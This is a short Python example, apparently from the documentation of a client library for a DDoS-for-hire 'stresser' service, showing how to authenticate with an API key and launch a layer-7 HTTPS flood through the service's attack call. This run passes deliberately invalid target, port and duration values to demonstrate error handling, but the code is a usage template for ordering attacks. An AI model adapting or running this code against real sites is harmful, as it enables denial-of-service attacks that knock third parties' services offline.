from doomstresser import DoomApi, L7Method, DoomApiError

#Create key - https://doom-stresser.cc/api
doom = DoomApi("<user-id>", "<key>") 

try:
    response = doom.layer7.attack(
        target="invalid url",
        port=100000000,
        method=L7Method.DOOM_HTTPS,
        duration=0
    )
except DoomApiError as e:
     print(e.args[0]) #error msg